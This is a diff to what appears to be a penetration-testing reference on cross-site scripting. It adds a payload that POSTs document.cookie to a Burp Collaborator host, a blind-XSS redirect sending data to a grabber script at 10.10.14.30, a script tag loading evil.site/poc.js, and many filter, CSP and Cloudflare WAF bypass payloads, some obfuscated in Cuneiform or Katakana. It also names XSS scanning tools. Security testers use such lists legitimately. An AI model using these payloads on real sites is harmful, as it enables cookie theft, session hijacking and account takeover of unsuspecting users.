@@ -37,31 +37,34 @@ Cross-site scripting (XSS) is a type of computer security vulnerability typicall
   - [Bypass dot filter](#bypass-dot-filter)
   - [Bypass parenthesis for string](#bypass-parenthesis-for-string)
   - [Bypass parenthesis and semi colon](#bypass-parenthesis-and-semi-colon)
-  - [Bypass onxxxx= blacklist](#bypass-onxxxx---blacklist)
+  - [Bypass onxxxx= blacklist](#bypass-onxxxx-blacklist)
   - [Bypass space filter](#bypass-space-filter)
   - [Bypass email filter](#bypass-email-filter)
   - [Bypass document blacklist](#bypass-document-blacklist)
   - [Bypass using javascript inside a string](#bypass-using-javascript-inside-a-string)
-  - [Bypass using an alternate way to redirect](#bypass-unsing-an-alternate-way-to-redirect)
+  - [Bypass using an alternate way to redirect](#bypass-using-an-alternate-way-to-redirect)
   - [Bypass using an alternate way to execute an alert](#bypass-using-an-alternate-way-to-execute-an-alert)
-  - [Bypass ">" using nothing](#bypass----using-nothing)
-  - [Bypass "<" using ＜](#bypass----using-＜)
-  - [Bypass ";" using another character](#bypass-using------using-another-character)
+  - [Bypass ">" using nothing](#bypass--using-nothing)
+  - [Bypass "<" and ">" using ＜ and ＞](#bypass--and--using--and-)
+  - [Bypass ";" using another character](#bypass--using-another-character)
   - [Bypass using HTML encoding](#bypass-using-html-encoding)
   - [Bypass using Katana](#bypass-using-katana)
+  - [Bypass using Cuneiform](#bypass-using-cuneiform)
   - [Bypass using Lontara](#bypass-using-lontara)
   - [Bypass using ECMAScript6](#bypass-using-ecmascript6)
   - [Bypass using Octal encoding](#bypass-using-octal-encoding)
   - [Bypass using Unicode](#bypass-using-unicode)
-  - [Bypass using UTF-7](#bypass-using-utf---7)
-  - [Bypass using UTF-8](#bypass-using-utf---8)
-  - [Bypass using UTF-16be](#bypass-using-utf---16be)
-  - [Bypass using UTF-32](#bypass-using-utf---32)
+  - [Bypass using UTF-7](#bypass-using-utf-7)
+  - [Bypass using UTF-8](#bypass-using-utf-8)
+  - [Bypass using UTF-16be](#bypass-using-utf-16be)
+  - [Bypass using UTF-32](#bypass-using-utf-32)
   - [Bypass using BOM](#bypass-using-bom)
   - [Bypass using weird encoding or native interpretation](#bypass-using-weird-encoding-or-native-interpretation)
   - [Bypass using jsfuck](#bypass-using-jsfuck)
 - [CSP Bypass](#csp-bypass)
 - [Common WAF Bypass](#common-waf-bypass)
+
+
 
 ## Exploit code or POC
 
@@ -85,6 +88,18 @@ $fp = fopen('cookies.txt', 'a+');
 fwrite($fp, 'Cookie:' .$cookie."\r\n");
 fclose($fp);
 ?>
+```
+
+### CORS
+
+```html
+<script>
+  fetch('https://<SESSION>.burpcollaborator.net', {
+  method: 'POST',
+  mode: 'no-cors',
+  body: document.cookie
+  });
+</script>
 ```
 
 ### UI redressing
@@ -119,9 +134,49 @@ More exploits at [http://www.xss-payloads.com/payloads-list.html?a#category=all]
 
 ## Identify an XSS endpoint
 
+This payload opens the debugger in the developper console rather than triggering a popup alert box.
+
 ```javascript
 <script>debugger;</script>
 ```
+
+Modern applications with content hosting can use [sandbox domains][sandbox-domains]
+
+> to safely host various types of user-generated content. Many of these sandboxes are specifically meant to isolate user-uploaded HTML, JavaScript, or Flash applets and make sure that they can't access any user data.
+
+[sandbox-domains]:https://security.googleblog.com/2012/08/content-hosting-for-modern-web.html
+
+For this reason, it's better to use `alert(document.domain)` or `alert(window.origin)` rather than `alert(1)` as default XSS payload in order to know in which scope the XSS is actually executing.
+
+Better payload replacing `<script>alert(1)</script>`:
+
+```html
+<script>alert(document.domain.concat("\n").concat(window.origin))</script>
+```
+
+While `alert()` is nice for reflected XSS it can quickly become a burden for stored XSS because it requires to close the popup for each execution, so `console.log()` can be used instead to display a message in the console of the developper console (doesn't require any interaction).
+
+Example:
+
+```html
+<script>console.log("Test XSS from the search bar of page XYZ\n".concat(document.domain).concat("\n").concat(window.origin))</script>
+```
+
+References:
+
+- [Google Bughunter University - XSS in sandbox domains](https://sites.google.com/site/bughunteruniversity/nonvuln/xss-in-sandbox-domain)
+- [LiveOverflow Video - DO NOT USE alert(1) for XSS](https://www.youtube.com/watch?v=KHwVjzWei1c)
+- [LiveOverflow blog post - DO NOT USE alert(1) for XSS](https://liveoverflow.com/do-not-use-alert-1-in-xss/)
+
+### Tools 
+
+Most tools are also suitable for blind XSS attacks:
+
+* [XSSStrike](https://github.com/s0md3v/XSStrike): Very popular but unfortunately not very well maintained
+* [xsser](https://github.com/epsylon/xsser): Utilizes a headless browser to detect XSS vulnerabilities
+* [Dalfox](https://github.com/hahwul/dalfox): Extensive functionality and extremely fast thanks to the implementation in Go
+* [XSpear](https://github.com/hahwul/XSpear): Similar to Dalfox but based on Ruby
+* [domdig](https://github.com/fcavallarin/domdig): Headless Chrome XSS Tester
 
 ## XSS in HTML/Applications
 
@@ -133,6 +188,10 @@ More exploits at [http://www.xss-payloads.com/payloads-list.html?a#category=all]
 <scr<script>ipt>alert('XSS')</scr<script>ipt>
 "><script>alert('XSS')</script>
 "><script>alert(String.fromCharCode(88,83,83))</script>
+<script>\u0061lert('22')</script>
+<script>eval('\x61lert(\'33\')')</script>
+<script>eval(8680439..toString(30))(983801..toString(36))</script> //parseInt("confirm",30) == 8680439 && 8680439..toString(30) == "confirm"
+<object/data="jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;">
 
 // Img payload
 <img src=x onerror=alert('XSS');>
@@ -152,6 +211,8 @@ More exploits at [http://www.xss-payloads.com/payloads-list.html?a#category=all]
 "><svg/onload=alert(String.fromCharCode(88,83,83))>
 "><svg/onload=alert(/XSS/)
 <svg><script href=data:,alert(1) />(`Firefox` is the only browser which allows self closing script)
+<svg><script>alert('33')
+<svg><script>alert&lpar;'33'&rpar;
 
 // Div payload
 <div onpointerover="alert(45)">MOVE HERE</div>
@@ -198,6 +259,12 @@ e.g: 14.rs/#alert(document.domain)
 ```javascript
 <input type="hidden" accesskey="X" onclick="alert(1)">
 Use CTRL+SHIFT+X to trigger the onclick event
+```
+
+### XSS when payload is reflected capitalized
+
+```javascript
+<IMG SRC=1 ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>
 ```
 
 ### DOM based XSS
@@ -412,7 +479,6 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'https://yoursu
 
 - [sleepy-puppy - Netflix](https://github.com/Netflix-Skunkworks/sleepy-puppy)
 - [bXSS - LewisArdern](https://github.com/LewisArdern/bXSS)
-- [BlueLotus_XSSReceiver - FiresunCN](https://github.com/firesunCN/BlueLotus_XSSReceiver)
 - [ezXSS - ssl](https://github.com/ssl/ezXSS)
 
 ### Blind XSS endpoint
@@ -427,6 +493,22 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'https://yoursu
   - Administrative Panel logs
 - Comment Box
   - Administrative Panel
+
+### Tips
+
+You can use a [Data grabber for XSS](#data-grabber-for-xss) and a one-line HTTP server to confirm the existence of a blind XSS before deploying a heavy blind-XSS testing tool.
+
+Eg. payload
+
+```html
+<script>document.location='http://10.10.14.30:8080/XSS/grabber.php?c='+document.domain</script>
+```
+
+Eg. one-line HTTP server:
+
+```
+$ ruby -run -ehttpd . -p8080
+```
 
 ## Mutated XSS
 
@@ -780,10 +862,12 @@ You don't need to close your tags.
 <svg onload=alert(1)//
 ```
 
-### Bypass "<" using ＜
+### Bypass "<" and ">" using ＜ and ＞
+
+Unicode Character U+FF1C and U+FF1E
 
 ```javascript
-[̕h+͓.＜script/src=//evil.site/poc.js>.͓̮̮ͅ=sW&͉̹̻͙̫̦̮̲͏̼̝̫́̕
+＜script/src=//evil.site/poc.js＞
 ```
 
 ### Bypass ";" using another character
@@ -822,6 +906,15 @@ Using the [Katakana](https://github.com/aemkei/katakana.js) library.
 javascript:([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()
 ```
 
+### Bypass using Cuneiform
+
+```javascript
+𒀀='',𒉺=!𒀀+𒀀,𒀃=!𒉺+𒀀,𒇺=𒀀+{},𒌐=𒉺[𒀀++],
+𒀟=𒉺[𒈫=𒀀],𒀆=++𒈫+𒀀,𒁹=𒇺[𒈫+𒀆],𒉺[𒁹+=𒇺[𒀀]
++(𒉺.𒀃+𒇺)[𒀀]+𒀃[𒀆]+𒌐+𒀟+𒉺[𒈫]+𒁹+𒌐+𒇺[𒀀]
++𒀟][𒁹](𒀃[𒀀]+𒀃[𒈫]+𒉺[𒀆]+𒀟+𒌐+"(𒀀)")()
+```
+
 ### Bypass using Lontara
 
 ```javascript
@@ -845,15 +938,6 @@ javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50
 ### Bypass using Unicode
 
 ```javascript
-Unicode character U+FF1C FULLWIDTH LESS­THAN SIGN (encoded as %EF%BC%9C) was
-transformed into U+003C LESS­THAN SIGN (<)
-
-Unicode character U+02BA MODIFIER LETTER DOUBLE PRIME (encoded as %CA%BA) was
-transformed into U+0022 QUOTATION MARK (")
-
-Unicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was
-transformed into U+0027 APOSTROPHE (')
-
 Unicode character U+FF1C FULLWIDTH LESS­THAN SIGN (encoded as %EF%BC%9C) was
 transformed into U+003C LESS­THAN SIGN (<)
 
@@ -957,7 +1041,9 @@ Check the CSP on [https://csp-evaluator.withgoogle.com](https://csp-evaluator.wi
 <script/src=//google.com/complete/search?client=chrome%26jsonp=alert(1);>"
 ```
 
-More JSONP endpoints available in [/Intruders/jsonp_endpoint.txt](Intruders/jsonp_endpoint.txt)
+More JSONP endpoints:
+* [/Intruders/jsonp_endpoint.txt](Intruders/jsonp_endpoint.txt)
+* [JSONBee/jsonp.txt](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt)
 
 ### Bypass CSP by [lab.wallarm.com](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa)
 
@@ -986,16 +1072,23 @@ Works for CSP like `script-src self`
 
 ### Bypass CSP by [@404death](https://twitter.com/404death/status/1191222237782659072)
 
-Works for CSP like `script-src 'self' data:`
+Works for CSP like `script-src 'self' data:` as warned about in the official [mozilla documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src).
 
 ```javascript
-<script ?/src="data:+,\u0061lert%281%29">/</script>
+<script src="data:,alert(1)">/</script>
 ```
 
 
 ## Common WAF Bypass
 
 ### Cloudflare XSS Bypasses by [@Bohdan Korzhynskyi](https://twitter.com/bohdansec)
+
+#### 25st January 2021
+
+```html
+<svg/onrandom=random onload=confirm(1)>
+<video onnull=null onmouseover=confirm(1)>
+```
 
 #### 21st April 2020
 
